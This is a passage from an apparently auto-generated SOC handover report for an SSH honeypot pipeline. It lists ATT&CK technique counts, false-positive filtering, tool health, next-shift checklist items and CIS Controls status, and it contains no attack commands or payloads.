| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 162 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 161 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 160 |

---

## 🔕 False Positive Summary (21 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 19 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 12 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 280 cases |
| Tool 34  | Credential Extractor        | ✅ 241 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 14 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 92 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 21 filtered (7.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 59 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 27 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 219 priority case(s) shown individually · 23 recon entry/entries in table (7 group(s) consolidating 24 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-24T21:08:36Z_
